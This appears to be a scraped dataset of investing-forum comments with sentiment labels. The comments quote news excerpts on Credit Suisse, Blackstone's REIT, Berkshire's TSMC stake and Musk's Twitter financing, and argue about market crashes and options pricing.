as for blackstone, they are constantly buying and aquiring new ventures, and they have expsoure to a lot of sectors everything from motel 6 to bumble and a lot of realestate, you get a lot of bang for your buck with blackstone. 

just my thoughts, there's also a lot of great etfs out there like jepi, schd and one i don't think that gets as much attention as it should but schp as well, which is an inflation protected bond etf with a monthly dividend.

credit suisse taps rbc, morgan stanley for capital increase -bloomberg news

reuters

oct 18 (reuters) - credit suisse group ag (csgn.s) is working with banks including royal bank of canada (rbc) (ry.to) and morgan stanley (ms.n) on a potential capital increase, should it need to shore up its balance sheet and raise funds for its restructuring, bloomberg news reported on tuesday, citing people familiar with the matter.

a capital increase through a possible share sale, under the name project ghana, could come after the bank's formal restructuring announcement on oct. 27, the report added.

the report said that credit suisse, one of europe's biggest banks, would likely seek at least $2 billion to cover restructuring and any operating losses over the next couple of years as it pivots the business.

the swiss bank is trying to recover from a string of scandals, including losing more than $5 billion from the collapse of investment firm archegos last year, when it also had to suspend client funds linked to failed financier greensill.

analysts at goldman sachs last week said the capital shortfall could be as large as 8 billion swiss francs ($8.03 billion) by 2024. they saw the bank facing ""headwinds"" including weak markets and an investment bank they said lacks scale.

credit suisse and morgan stanley declined to comment. royal bank of canada did not immediately respond to a reuters request for comment.

earlier, reuters reported citing a source that credit suisse has approached at least one middle eastern sovereign wealth fund for a capital injection, while some funds are looking at the scandal-hit bank's businesses as potential investment opportunities.";6.0;;SpiritTalker;0.0;False;False;Positive;Neutral;Negative

1668972170;"put simply, shorting a stock is when you borrow shares from someone who owns it for an agreed period of time, sell it to someone else and then agree with the person you're selling it to, to buy it back in time to return it to the original seller.

the reason you would do this is because you think the stock is going to drop in value between you selling your borrowed stock and having to buy it back again. if you can sell the stock for $50 a share and then buy it back at only $20 a share then you've just made a healthy $30 profit per share.

in short: you're betting that the share value of a company will go down during a fixed period of time.

gamestop has been struggling significantly over the last few years, unable to adapt to the rise of digital storefronts similar to blockbuster back in the day. a lot of large, wealthy traders around the world had been planning to short the stock (bet it will go down), confident in their predictions.

a few online communities - especially /r/wallstreetbets - decided to mess with the big traders by forcing the stock to sky rocket instead, generating huge losses for everyone who shorted the stock. how do you force stock value to rise? buy lots of it. as with anything in high demand, the price goes up when there is demand to buy the stock. and so, large numbers of people conspired to buy up as much gs stock as possible for the lols, and the stock price did indeed shoot up suddenly.

the controversy around the shutting down of trading on platforms like robinhood, was that it was seen by many as a deliberate attempt to protect the big trading conglomerates who had shorted the stock, and a form of market manipulation to stop the gs stock rising. of course, you could also argue that large groups of people conspiring online to do the opposite is also market manipulation, but that is where i'm not qualified to weigh in on who is right or wrong...";49.0;;Neoptolemus85;0.0;False;False;Positive;Positive;Negative

ryan cohen ignored the naysayers when he cofounded an online pet-supplies retailer in 2011 and squared off against amazon and pets.com.

he ultimately sold the company for $3.4 billion in 2017, and stepped down as ceo the following year to spend more time with his family and pursue personal goals.

cohen broke with convention again by investing the vast majority of his wealth in two stocks, apple and wells fargo. he later placed a contrarian bet on gamestop and secured three seats on the video-game retailer's board in january, laying the groundwork for an astronomical rally in its stock price.

the entrepreneur attributes his independent streak to the ""two biggest influences on my professional life"": his father, ted cohen, who passed away in december 2019, and warren buffett, the billionaire investor and berkshire hathaway ceo.

""something critical that i learned from my dad and warren buffett was the ability to separate myself from the herd and think independently,"" cohen told insider in an october interview.

the pair's teachings allow him to ""block out the noise, develop my own point of view, and not be influenced by daily headlines or the consensus or what's in style.""

for example, many people initially doubted chewy would be able to ship 30-pound bags of pet food to customers and make any money.

""in the early years, few investors thought chewy was a good idea,"" cohen said. ""i struck out raising capital over 100 times.""

ignoring the skeptics, as well as avoiding distractions and saying ""no"" to all but the best opportunities, enabled cohen to focus on the things most critical to chewy's success: competitive prices, compelling products, fast shipping, and personalized customer service.

the former chewy chief credited his dad, who ran a glassware-importing business, with giving him the courage of his convictions.

cohen's father taught him to trust his instincts, treated him like an adult from an early age, solicited and listened to his opinions, and demonstrated what it meant to deeply understand a business.

""i learned how to build my company by watching him build his,"" cohen said.

going all in

after selling chewy, cohen plowed the bulk of his windfall into apple and wells fargo, flouting traditional investment advice about the need for a diversified portfolio.

cohen felt comfortable with his decision partly because he bought his first apple share at age 15, making it one of the first stocks he ever owned. the technology titan's ecosystem of hardware, software, and services — which makes it a headache for users to switch to rival products — was a key attraction, he said.

apple's offerings have become even more integral to people's lives during the pandemic, cohen argued. people increasingly rely on their iphones, ipads, macbooks, and apps to keep in touch with friends and family, work from home, conduct daily tasks such as shopping and banking, and entertain themselves.

""the strongest business in the world,"" cohen proclaimed, echoing buffett's comment in february 2020 that apple is ""probably the best business i know.""

cohen also brushed off concerns about apple's valuation, arguing that it's relatively cheap when rock-bottom interest rates mean bonds are yielding close to zero.

cohen declined to comment on his wells fargo and gamestop investments.

betting like buffett

cohen's emphasis on focus, independent thought, and investing with conviction aren't the only strategies he shares with buffett.

the chewy cofounder cited 'disciplined capital allocation,"" or spending money strategically and responsibly, as a key driver of his company's success. buffett specializes in taking the cash flowing into berkshire from its scores of subsidiaries, and redeploying it where it's needed most.

cohen focused on selling pet food at chewy, because he recognized that customers would slash every expense they could before cutting back on feeding their pets, resulting in a ""sticky"" customer base.

consumables offered slimmer profit margins than toys or accessories, but the lifetime value of their buyers relative to the cost of acquiring them meant they generated higher returns in the long haul, he added.

buffett famously favors companies that sell essential or staple products and services to a dedicated customer base. for example, berkshire counts american express, visa, mastercard, coca-cola, procter &amp; gamble, and kraft heinz among the roughly 45 stocks in its portfolio.

cohen and buffett also have investments in common. apple is by far the most valuable holding in berkshire's portfolio, and the conglomerate owned $3 billion worth of wells fargo stock at the last count.

finally, cohen practices buffett's advice to ""be greedy when others are fearful.""

1669573753;"buffett's berkshire hathaway discloses $4.1 billion tsmc stake  
[by jonathan stempel](https://www.reuters.com/markets/deals/buffetts-berkshire-discloses-big-taiwan-semi-stake-2022-11-14/)

  
nov 14 (reuters) - berkshire hathaway inc (brka.n) said it bought more than $4.1 billion of stock in taiwan semiconductor manufacturing (2330.tw), , a rare significant foray into the technology sector by billionaire warren buffett's conglomerate.  
the news sent shares in tsmc soaring, closing up 7.9% in taiwan on tuesday, as it boosted investor sentiment for the world's largest contract chipmaker, which saw its shares hit a two-year low last month due to a sharp slowdown in global chip demand.

tsmc's other foreign investors include u.s. asset managers blackrock inc (blk.n) and vanguard group inc, and singapore sovereign wealth fund gic (gic.ul).  
berkshire also disclosed new stakes of $297 million in building materials company louisiana-pacific corp (lpx.n) and $13 million in jefferies financial group inc (jef.n). it exited an investment in store capital corp (stor.n), a real estate company that agreed in september to be taken private.  
the filing did not specify whether buffett or his portfolio managers todd combs and ted weschler made specific purchases and sales. investors often try to piggy back on what berkshire buys. larger investments are normally buffett's.  
while berkshire does not normally make big technology bets, it often prefers companies it perceives to have competitive advantages, often through their size.  
tsmc, which makes chips for the likes of apple inc (aapl.o), qulacomm (qcom.o) and nvidia corp (nvda.o), posted an 80% jump in quarterly profit last month, but struck a more cautious note than usual on upcoming demand.

""i suspect berkshire has a belief that the world cannot do without the products manufactured by taiwan semi,"" said tom russo, a partner at gardner, russo &amp; quinn in lancaster, pennsylvania, which owns berkshire shares.  
""only a small number of companies that can amass the capital to deliver semiconductors, which are increasingly central to people's lives,"" he added.  
berkshire has had mixed success in technology.  
its more than six-year wager during the last decade in ibm corp (ibm.n) did not pan out, but berkshire is sitting on huge unrealized gains on its $126.5 billion stake in apple, which buffett views more as a consumer products company.  
apple is by far the largest investment in berkshire's $306.2 billion equity portfolio.  
berkshire disclosed the tsmc stake about 2-1/2 months after it began reducing a decade-old, multi-billion dollar stake in byd co (002594.sz), china's largest electric car company.  
in the third quarter, berkshire added to its stakes in chevron corp (cvx.n), occidental petroleum corp (oxy.n), celanese corp (ce.n), paramount global (para.o) and rh (rh.n).  
it also sold shares of activision blizzard inc (atvi.o), bank of new york mellon corp (bk.n), general motors co (gm.n), kroger co (kr.n) and us bancorp (usb.n).

___

dec 1 (reuters) - florida's chief financial officer said on thursday his department would pull $2 billion worth of its assets managed by blackrock inc (blk.n), the biggest such divestment by a state opposed to the asset manager's environmental, social and corporate governance (esg) policies.

the move will hardly dent blackrock's $8 trillion in assets and drew a strong response from the company, which said the action put politics over investor interests.

nonetheless it underscores how a backlash against esg investing is gathering steam among republican leaders in florida, and elsewhere, who criticize corporations for focusing on matters like climate change or workforce diversity.

republicans are set to assume control of the u.s. house of representatives in january. this will allow them to hold hearings on esg and grill company executives about their policies, and also pressure regulators to scrutinize them.

in a statement, florida cfo jimmy patronis said the state's treasury, which he oversees, would remove blackrock as manager of about $600 million of short-term investments and have its custodian freeze $1.43 billion of long-term securities now with blackrock, with an eye on reallocating the money to other money managers by the start of 2023.

patronis accused blackrock of focusing on esg rather than higher returns for investors.

""florida's treasury division is divesting from blackrock because they have openly stated they've got other goals than producing returns,"" patronis said in the statement provided by his office.

asked about the move, blackrock said in a statement: ""we are disturbed by the emerging trend of political initiatives like this that sacrifice access to high-quality investments and thereby jeopardize returns, which will ultimately hurt florida&amp;#146;s citizens. fiduciaries should always value performance over politics.""

neither patronis nor his office had raised any performance concerns, blackrock said, adding it has invested more than $65 billion in florida-based companies, municipal bonds and other securities.";1.0;;politicly1;0.0;False;False;Positive;Positive;Negative

new york, dec 1 (reuters) - (this dec. 1 story has been corrected to fix part of snyder's quote to reference to arbitrage)

blackstone inc (bx.n) limited withdrawals from its $69 billion unlisted real estate income trust (reit) on thursday after a surge in redemption requests, an unprecedented blow to a franchise that helped it turn into an asset management behemoth.

the curbs came because redemptions hit pre-set limits, rather than blackstone setting the limits on the day. nonetheless, they fueled investor concerns about the future of the reit, which makes up about 17% of blackstone's earnings. blackstone shares ended down 7.1% on the news on thursday. they were down a further 2% on friday morning at $83.45.

many investors in the reit are concerned that blackstone has been slow to adjust the vehicle's valuation to that of publicly traded reits that have taken a hit amid rising interest rates, a source close to the fund said. rising interest rates weigh on real estate values because they make financing properties more expensive.


blackstone has reported a 9.3% year-to-date return for its reit, net of fees, a contrast to the publicly traded dow jones u.s. select reit total return index (.dwrtft) 22.19% decline over the same period.



alex snyder, a portfolio manager at centersquare investment management llc in philadelphia, said the arbitrage between the value blackstone has assigned to its real estate portfolio and the value of publicly traded reits caught the eye of investors.


""people are taking profits at the value blackstone says their reit shares are at,"" said snyder.

a blackstone spokesperson declined to comment on how the new york-based firm calculates the valuation of its reit, but said its portfolio was concentrated in rental housing and logistics in the southern and western united states that have short duration leases and rents outpacing inflation.

report an ad
the spokesperson added that the reit relied on a long-term fixed rate debt structure, making it resilient.

""our business is built on performance, not fund flows, and performance is rock solid,"" the spokesperson said.

the reit is marketed to wealthy individual investors. two sources familiar with the matter said turmoil in asian markets, fueled by concerns about china's economic prospects and political stability, contributed to the redemptions. the majority of investors redeeming were from asia and needed the liquidity, they said.

blackstone told investors in a letter it would curb withdrawals from its reit after it received redemption requests in november greater than 2% of its monthly net asset value and 5% of its quarterly net asset value. as a result, the reit allowed investors in november to redeem $1.3 billion, equivalent to approximately 43% of investors' repurchase requests.

barclays analysts downgraded their rating of blackstone's stock to ""equal weight"" from ""overweight"" and cut their price target to $90 from $98 on friday. they and other analysts said blackstone's reit runs the risk of getting caught in a spiral of selling assets to meet redemptions if it cannot regain the trust of its investors. on thursday, the firm said the reit had agreed to sell its 49.9% interest in two las vegas casinos for $1.27 billion.

""the impact on blackstone depends on whether the reit is able to stabilize its net asset value over time, or is forced to enter an extended run-off scenario, with significant asset sales and ongoing redemption backlog — too early to tell, in our view,"" bmo capital markets analysts wrote in a note.

blow to blackstone's plans
the reit turmoil is a setback for two of blackstone's strategies that helped it become the world's biggest alternative asset manager with $951 billion in assets: real estate investing and attracting high net-worth individuals.

blackstone launched the reit in 2017, piggybacking off the success of its real estate empire, which had by then outgrown its private equity business. its president jonathan gray was elevated and made successor to chief executive stephen schwarzman as a result of his success in property investing.

the reit also represented a bid to win over high net-worth investors clamoring for private market products, which they believe perform better than those that are publicly traded.

blackstone has been seeking to diversify its investor base after tapping institutional investors, such as public pension funds, insurance firms and sovereign wealth funds, for its products for decades.

blackstone managed a total of $236 billion of wealth held by individuals as of the end of september, up 43% year-on-year.

credit suisse analysts wrote in a note that they expected the reit's woes to weigh on blackstone's fee-related earnings and assets under management. ""these all will continue put pressure on blackstone's premium valuation,"" they wrote.

on blackstone's third-quarter earnings call in october, gray blamed reit redemptions on market volatility, which he said had driven away individual investors from active equity and fixed income funds.

he added that the reit had ample cash reserves to ""weather pretty much any storm."" these cash reserves totaled $2.7 billion as of the end of october, according to its prospectus. blackstone also said in the prospectus it had access to $9.3 billion in ""immediate liquidity.""

""it's not a surprise that you would see a deceleration in flows from individual investors when you've had this kind of market decline,"" gray said.";3.0;;100milliondone;0.0;False;False;Positive;Positive;Negative

&gt;blackrock (blk.n), the world's largest fund manager, has a 6.7% stake in exxon, and its vote illustrates how frustrated shareholders have become after years of having the company dismiss concerns about its strategy. investors have grown much more serious about fighting climate change.

1670478076;"""dec 7 (reuters) - billionaire elon musk's bankers are considering providing the tesla inc (tsla.o) chief executive officer with new margin loans backed by the u.s. automaker's stock to replace some of the high interest debt on his twitter deal, bloomberg news reported on wednesday.
  

  
the margin loans are one of the options that the morgan stanley (ms.n)-led bank group and musk's advisers have discussed to ease the $13 billion debt twitter took on as part of musk's $44 billion deal, the report said, citing people with knowledge of the matter.
  

  
the discussions have so far centered around replacing the $3 billion of unsecured debt on which twitter pays an interest rate of 11.75%, the maximum banks had agreed to finance the acquisition in april, the report said.
  

  
morgan stanley (ms.n), bank of america corp (bac.n), barclays plc (barc.l) and mitsubishi ufj financial group inc (8306.t) led the $13 billion financing for the bid by musk.
  

  
tesla and morgan stanley did not immediately respond to a reuters request for comment.
  

  
the banks are not expected to offload any of the twitter debt to institutional investors until the new year, bloomberg reported.
  

  
reuters reported in october that banks had abandoned plans to sell the debt to investors because of uncertainty around twitter's fortunes and losses.
  

  
musk closed the deal with $13 billion in loans from banks and a $33.5 billion equity commitment, which included his 9.6% twitter stake worth $4 billion and $7.1 billion from investors including oracle corp (orcl.n) co-founder larry ellison and saudi prince alwaleed bin talal.""";2.0;;Ithinkstrangely;0.0;False;False;Negative;Positive;Neutral

and he should have been keeping his crypto in exchange that reports back to the employer. this isn't always a requirement, but for anyone who is a manager or above it is typically required that the broker sends monthly reports so the company can verify no illegal years have occurred.

in many circumstances, even the appearance of a conflict of interest is grounds for civil or even criminal fines.

1670628782;"that's sort of right. the greeks aren't *based* on those things, they are solutions to equations in which time, strike, reference price etc are known parameters, and in which realised volatility has to be substituted for by implied volatility, because obviously the *realised* part of realised vol hasn't actually happened yet.

so, implied vol isn't really a supply and demand tracker exactly. it's literally the price. the premium paid is a fixed derivative\* of the implied vol, since all the other parameters in black scholes are known at the time of setting the premium. so the implied vol is the true price.

\*even this isn't quite true. when trading options in the interbank market, they are priced in vols. so as a dealer, you get asked for, say, your price for an option at a particular strike and expiry and a particular size, and you would reply 11.34 (meaning implied vol of 11.34%) for instance. i'm not 100% sure how it would in markets like equity options, where you might use the strikes on existing contracts. but in something purely otc like fx you don't even name the strike, you would say, for instance ""eurusd jan 10th 25 delta downside in 200"". because the delta is something you can solve from the other inputs. note you're not even being asked for puts, specifically. convention in many markets is to trade straddles, so that request would actually be for the straddle in 100 per leg. but even that really doesn't matter, because you're exchanging the delta anyway, so you really don't care whether it's puts, calls, straddles or whatever. you're a vol trader. you're trading the vol surface. in theory, unless you specifically want to trade the spot directionally,  you're going to be delta hedging yourself the entire time, or as close to it as is practical.

market making a book of options electronically is quite interesting in this regard - you basically publish an entire vol surface, setting the ivs for a range of deltas / strikes from atm out to say 5 delta puts and calls, across the range of expiries that you're covering. and then the surface between those points is just interpolated. and you can pick out specific dates and change the interpolation calculation, or just enter a standout iv, like if there's a big risk event like, say, fomc day next week, and you want to drag implieds higher to cover the increased risk premium.

looking at a live vol surface rendered on a screen in 3d is very helpful for understanding options markets (and once you've seen them in 3d, building a mental picture of it from just seeing the numerical implieds is a lot easier in future).

the reason i say they aren't quite a tracker of supply and demand is because, well, they *are* in the same way that any price is. but as with any price, vols being elevated doesn't necessarily mean that someone is buying vol... like in em fx, pretty much all pairs will have skew to the topside, meaning that for any usd/em fx pair, the 25 delta topside strike will be priced higher (have a higher iv, and hence cost more premium) than the 25 delta downside strike for the same date. and the opposite is true in equity options. the jan expiry 25delta $jpm puts will have a higher implied volatility than the jan expiry 25delta $jpm calls. several reasons: 1/ because moves to the downside in equities tend to be associated with higher volatility regimes, so there *should* be a skew, irrespective of demand. 2/ because there is indeed natural demand for equity downside even in bull markets, for hedging and so on. 3/ because ""excess premium capture"" is a thing that a lot of investors do to enhance returns. like, selling otm covered calls on stocks you own. so you cap your upside if the stock explodes upward through your strike, but in a normal environment you just collect a bit of premium for selling low delta topside, increasing your return profile. literally selling some of your upside exposure. which creates a natural supply of vol to the topside, which doesn't really exist as much to the downside. all the exact same dynamics produce the same effect (albeit to the topside) in usd/emfx. and of all of those, 2 and 3 are indeed ""supply and demand tracking"", but 1 isn't, really.";3.0;;odonnthe;0.0;False;False;Positive;Negative;Neutral
1670640954;"&gt;big finance has lost an ally in the u.s. democratic party. senator kyrsten sinema is changing her party registration from democrat to independent, capping a years-long ideological shift by the arizona senator away from liberals and toward the political center. it may accelerate wall street’s own shift to the right.

&gt;sinema was an outlier in her support for investors and fund managers. she has raised nearly $2.7 million from the securities and investing sector since 2017, according to opensecrets data, and broke with democrats last year when they pushed to raise taxes on the wealthiest u.s. households. she was the sole democrat to vote against changing the tax treatment of carried interest in august, ensuring private equity fund managers continue to pay less on their profits than the rate charged on regular income.

&gt;the financial sector has been moving away from the political left – physically, in some cases. industry giants including goldman sachs , citadel and tiger global management shifted staff to florida during the pandemic, trading the solidly democratic government of new york for a substantially more conservative environment.

&gt;some of the biggest names on wall street have similarly tied themselves to the republican party’s leaders. former goldman sachs president and registered democrat gary cohn served as the director of the national economic council in the donald trump administration. citadel chief executive ken griffin has already said he will support florida governor ron desantis should he run for president in 2024. jpmorgan ceo jamie dimon admitted to cnbc in 2019 that ""my heart is democratic but my brain is kind of republican.""

&gt;that tension is most visible in the debate over esg investing, focused on environmental, social and governance considerations and increasingly identified with the political left. republicans in texas and florida are threatening to divert public investment away from what they see as a democratic agenda. vanguard said on wednesday it is pulling out of the net zero asset managers initiative, an industry effort to counter climate change. activist investor bluebell capital partners has criticized $8 trillion asset manager blackrock’s (blk.n) sometimes-cautious approach.

&gt;true, most executives would probably rather not get tangled in politics at all. but the gap between democrats and the financial sector has been growing for years. sinema’s exit, while it won’t change much in washington, gives wall street one more reason to come off the fence.

&gt;senator kyrsten sinema said on dec. 9 that she will change her party registration from democrat to political independent. the arizona senator said she plans to keep her committee seats and that she will not officially align with the republican party, signaling democrats will still hold an effective majority in the senate until the end of 2024.

1671218902;"“this could cast a shadow over the entire industry,” said sheldon chang, president of crowdstreet advisors, an asset manager that runs private real estate funds for individuals. “it will prompt a review of semi-liquid funds and their structure. people will tend to get overly conservative.”

blackstone said its returns speak for itself. “our business is built on performance, not fund flows, and performance is rock solid,” a spokesperson said, reiterating an earlier statement.

blackstone stock dropped to the lowest since april 2021 at 10:51 a.m. on friday, falling 3.6% to $74.59. shares have declined 42% this year.

lowering thresholds
blackstone has been continuing to make it easier for some investors to get into breit. starting this month, clients whose financial advisers route money to fidelity investments will be able to make minimum initial investments of $2,500 into breit’s lowest costing share class. the previous minimum for such customers was $1 million. a blackstone spokesman said the firm had been working toward this for months after clients asked for this option.

blackstone has mobilized its top executives in recent weeks to calm investor nerves. president jon gray went on cnbc to say the curbs prevented forced selling. schwarzman, the firm’s chief executive officer, said at a conference that breit’s redemptions have been spurred by investors needing liquidity for other reasons, rather than any indication of the fund’s performance.

the restrictions on withdrawals though have caused some advisers to harden their stance toward funds such as breit.

“it reinforced our view that we need to think of these as illiquid products,” said jeff demaso, director of research at newton, massachusetts-based adviser investments.";8.0;;JustBoatTrash;0.0;False;False;Positive;Neutral;Negative

in 2008 i was in a very different financial situation than i am today. it was all doom and gloom. i remember being in the gym, watching cnbc every day at 10 am, working out. watching the market absolutely collapse one day. just shredding it self like a car throwing a rod at 90 miles an hour.

everything was horrible, we were all going to be living in huts, wealth being destroyed, the financial system teetering on the edge of collapse, calamity, bailouts, stuffing money into mattresses, running to gold.

you could get bank of america stock at the time for something like a dollar a share. that was basically some high beta shitco of today. aig was selling for less than a dollar a share. worlds largest insurer. a dollar a share. 

people were saying berkshire was going under, it's exposure to the insurance industry was way too big.

complete dismal doom and gloom. stories of people throwing themselves off of buildings.

and yes, that was one of the possible outcomes in the ""choose your own adventure"" of life.

1999, i worked in media. daytrading was taking off. e*trade was the new thing, people were talking about how they were making fortunes daytrading. i remember the headlines of when the dow crossed 10,000, holy crap that number was so epic. 

the fomo was everywhere. gold was dead, selling for $200 an ounce. gold miners were going out of business, mines were closing. ""gold is done. we never seeing gold over $600 again.""

then asian financial crisis. international investing is dead, there's no future in emerging markets. china is a failing. 

when it's bad, it always feels like it's never getting better. when it's good, it never feels like it's going to end. 

the problem is the bad always feels worse than a good.

i think it's the long time equity trader walt deemer who was quoted as saying, ""when it's time to buy, you won't want to.""

nobody knows if it's going to be a lost decade. equities might not return. it could be like japan in the 90s. it could be a big leg down before another insane run up where aggregate pe of the s&amp;p hits 40 again.

but having lived through 2001, 2008. watching markets absolutely prolapse, walt was right. when it's time to invest, everything in your body tells you you don't want to. i'm not talking the urge to ""buy the dip,"" i'm talking the, ""i'm going to buy a five year cd instead.""

it's important to zoom out. look at the long chart, the chart from 1929 to today. look at how insignificant even the great depression was, world war ii, the 1960s and 70s. you don't even see the impact of those. they're just undulations on a line that curves upward.

1672338653;"things are already crashing, so i don’t think there’s anything i can say to help you see it.  
  
one very obvious truth is sros and politicians love insider trading, and showing barely any transparency.  
  
if you’re not a shill and you had your eyes open last year when powell announced his investment portfolio sell-off with his reasoning being conflict-of-interest worries, you’d be able to put 2 &amp; 2 together.  
  
there was no reason to announce his sell-off other than he knew when the end of the infinite bull market was, sold at the top, and because investing is often a zero-sum game, he had to make sure the public didn’t see it as a warning sign. it’s also a bonus whenever you act unethically so brazenly and add some “good/honest person” points to your reputation.  
  
immediately after he and the numerous others announced their sell-offs, the dramatic drops started happening and there is no sign of recovering. companies are down 70%, 60%, crazy percentages across the market.
after that is when the literal definition for a recession finally happened, which is still being tip-toed around.  
  
in what world does powell do what he did as a coincidence? the baby-crashing was almost immediately after. and it’s been a year, and no signs of letting up. and we’re in a recession. when we previously had an unbelievable everlasting bull market that would eventually experience a correction.  
  
in what world of economic cycles and timelines is it a coincidence that there’s a massive sell-off from many top officials happening right before a crashing market which not only fails to recover towards the upward trend, but persists until we reach recession level?  
  
in what world does a bull market that’s healthy and totally not going to crash get interrupted with all of this for this long, along with increasing interest rates, mortgages, plummeting mbs values (like in 2008), and then continue the bullishness?  
  
the timeline alone (over a year(s) now) is indicative of a new cycle, a new trend. this isn’t millisecond, daytrading-mindset peaks and valleys. this is non-stop months/quarters of opposite movement, lower highs and even lower lows.  
  
not to mention the divorces of many of the top billionaires the last couple of years.  
  
warren buffet, *the* long-term investor of long-term investors, held wells fargo stock for decades i believe. is it a coincidence that he chose of the past couple of years to sell it off in its entirety after holding for so long?  
  
in what rational market does the market crash in 2020 and recover almost immediately *without* involving insane money-printing volume that creates likely an even bigger mess to worry about in the future?  
  
no rational market. and the insane money printing from 2020 to now should be acknowledged as something that will lead to eventual ramifications down the line. hopefully, you get that. and if you get that, then this neverending shitshow should ring at least one alarm bell that maybe the ramifications have arrived.  
  
literally, many asset-backed securities, like mbs are tanking below what they were in 2008.  
  
we have 2008 as precedent to compare to. we have set definitions for words like “recession”.  
  
we are not only matching 2008 precedents, we have exceeded some of them already.  
  
if none of that matters,  
if you refuse to acknowledge the existence of corruption,  
and if your foundation is full of general, vague “rules” of the market that you treat like actual dogmatic universal truths (like, the market tends to correct itself … you can’t predict when this or that happens so don’t do anything)  
  
then i can see how you be able to remain optimistic about the market.  
  
if that’s how it is and you’re sticking to it, more power to you. but if you’re someone that consciously ignores precedent, inflation, recessions, shady sell-off timings around crashes, tech companies and more nosediving all over the place, i don’t know why you’re asking for proof.  
  
you’ll clearly only accept direct, personal instructions from buffett or powell showing you what the hft algorithms have in store for next year as proof that it would not be unwise to do something as *unbelievably drastic* as …  
  
putting everything/something into cash/money market funds. so crazy. buffett must become senile having half of his portfolio in cash at some point in the last two years.  
  
i just don’t get it.
  
ignore the fact that everything is trending downward. the fact that bull markets are not 100% guaranteed means strategies for bear markets are a logical plan b to consider, discuss, and think about.  
  
but people like you refuse to even *think* about it, probably encouraging people to take losses in stride because there was no way they could predict the market, so don’t even risk putting some of your portfolio in cash during a downward trend to lower tour losses.  
  
anyway, you’re  
  
-	either a shill,  
-	someone with no skin in the game,  
-	someone with enough money to not be affected either way so you just treat these discussions about the real world as academic debates about economic theory and you want to win the debate,  
  
all of the above are not worth respecting, *and* you should practice some self-awareness by not pretending you want to have a conversation in good faith.
—
lastly, you could be someone that was tricked into completely trusting the system and conflating optimistic outlooks of market as actual unbroken laws of market nature, and you’re committed to that sunk-cost at cost of whatever losses you endure and whatever failing strategies you recommend to others. as long as it means you weren’t at any point fooled by the market.  
  
i actually sympathize with this, but in the end, that’s a you problem that you shouldn’t spread to others.    
  
i mean, the fact that there are people in this world like dave lauer who was a quant for citadel, or sussanne trimbath who worked for the dtcc, and the martens of wall street on parade . com… people who believed in the market as much as you do, and maybe even *more* than you at some point, but didn’t run away from the truth and instead are doing what they can to enact positive change that can fix the market and result in it acting like we *thought* it did already…  
  
i would think that would give people like you pause.   -     to consider that the truth is more important than being right and not being fooled.
-	to consider that being fooled is not something that only happens to idiots and should be considered as something that happens to *everyone*, including *quants* and we just don’t talk about it, so it should be nothing more than something you brush off to learn how to not be fooled next time, as opposed to bending over backwards for an entire lifetime to make sure that you weren’t mistaken.  
-	 to consider that being fooled means you’re one step closer to the truth and can now advocate for it and fight for it, and that’s respectable.  
-	 to consider the life of someone fighting to educate everyone, not just themselves, and compare it to the life of someone whose single most important priority until they die is fighting to be right.  
  
  
i don’t know, man. in everything, i’d rather accept uncomfortable truths and messy, mistake-ridden transition periods than be so defensive of my ego that it results in me parroting whatever bs the .01% want me to believe so they can continue earning record profits while inflation worsens and they steal more and money from the regular people.  
  
and lastly, the market involves our money, so it’s not just that knowing the truth should be what’s important. it’s also acknowledging the truth will lead to you *also* protecting your money.  
  
tl;dr -  
  
different strokes for different folks, i guess. never mind the fact that it doesn’t have to be black and white and we can always make an honest effort to remain open-minded to a couple of new things here and there. it’s not like in the grand scheme of life, staying close-minded and defensive will result in literally defending an enormous amount of lies for *decades* for a decidedly shallow reason.  
  
anyway, everyone would be doing themselves a favor even just going on investopedia to look up ways to invest during a recession or any downtrend. the fact that people are out here maintaining that they’re logical, rational, and more sensible even though pensions and 401(k) have been destroyed before is wild to me. hedge funds literally hedge their bets and it’s sophisticated. calls, puts, how the fuck is this different? how can people actually believe that hedging against once-every-decade recessions, known-to-exist events that last for years is different and not worth considering despite the fact that regular people would benefit most from hedging compared to hedgefunds?  
  
this kind of close-mindedness is baffling. in the age of the internet, it shouldn’t exist. in the midst of inflation and the ever-growing chasm of wealth inequality, this shit shouldn’t exist.";-1.0;;EthErealist;0.0;False;False;Positive;Positive;Neutral

1672484534;"no tesla shares were used as collateral. twitter itself owns all the bank debt from the purchase.

**edit:**
not sure why my comments are being downvoted. i'm not defending elon just correcting a common misconception about how he financed his twitter purchase.  i posted links to articles from major news sites to back up what i'm saying,  while the user who is arguing against me hasn't been able to source any of his claims (he cannot because they are wrong).

**source 1**: [npr interview ""how elon bought twitter with other peoples money""](https://www.npr.org/transcripts/1139964806)
&gt; wong: when elon musk acquired twitter, he used a kind of deal that was really popular in the 1980s - the leveraged buyout. this is typically where an investment firm acquires a company using borrowed money, other people's money. that borrowed money is the leverage.

&gt; woods: carl tack is a former lawyer and investment banker. he's now an adjunct professor of finance at the college of william &amp; mary. we caught him up on the landline to have him explain leveraged buyouts to us.

&gt; wong: what makes a leveraged buyout unique is who ends up on the hook for the borrowed money. now, the money typically comes from banks, but it's not the investment firm that borrows the money; it's the company getting acquired.

&gt; woods: i mean, this is such a mind-bender. like, the company is taking on debt so that itself can get bought. and you might wonder why a company would agree to do this. like, why would it agree to a leveraged buyout? well, sometimes, it's an exit strategy, you know, for the company's owners or the company's shareholders. and in twitter's case, elon was offering a price well above where the company's shares were trading at the time.

&gt; tack: the end result is that that loan is a loan not to elon musk; it's a loan to twitter.


**source 2**: [""explainer: how elon musk funded the $44 billion twitter deal""]
(https://www.reuters.com/markets/us/how-will-elon-musk-pay-twitter-2022-10-07/)

&gt; musk pledged to provide $46.5 billion in equity and debt financing for the acquisition, which covered the $44 billion price tag and the closing costs. banks, including morgan stanley (ms.n) and bank of america corp (bac.n), committed to provide $13 billion in debt financing.

&gt; musk's $33.5 billion equity commitment included his 9.6% twitter stake, which is worth $4 billion, and the $7.1 billion he had secured from equity investors, including oracle corp (orcl.n) co-founder larry ellison and saudi prince alwaleed bin talal.

&gt; that had left musk in need for an additional $22.4 billion of funds to cover the equity financing portion of the deal.
&gt; ...
&gt; according to a reuters calculation, musk had about $20 billion cash after selling part of his stake in tesla through multiple transactions in november and december last year and april and august.

&gt; musk would have needed to raise an additional $2 billion to $3 billion to complete the financing for the deal.
